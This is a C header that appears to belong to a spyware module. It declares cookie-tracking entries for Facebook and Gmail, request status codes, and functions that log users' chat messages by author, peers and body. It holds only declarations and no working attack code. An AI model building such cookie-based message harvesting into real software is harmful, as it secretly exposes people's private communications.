#define SOCIAL_ENTRY_COUNT 2

#define SOCIAL_REQUEST_SUCCESS 0
#define SOCIAL_REQUEST_BAD_COOKIE 1
#define SOCIAL_REQUEST_NETWORK_PROBLEM 2

typedef unsigned long (*social_handler)(char *);

typedef struct {
	WCHAR domain[64];
	DWORD idle;
	BOOL wait_cookie;
	BOOL is_new_cookie;
	social_handler RequestHandler;
} social_entry_struct;

#define FACEBOOK_DOMAIN L"facebook.com"
#define GMAIL_DOMAIN L"mail.google.com"
#define FACEBOOK_DOMAINA "facebook.com"
#define GMAIL_DOMAINA "mail.google.com"

extern social_entry_struct social_entry[SOCIAL_ENTRY_COUNT];
extern void urldecode(char *src);
extern void CheckProcessStatus();
extern void LogSocialIMMessageA(char *program, char *topic, char *peers, char *author, char *body, struct tm *tstamp);
extern void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *author, WCHAR *body, struct tm *tstamp);






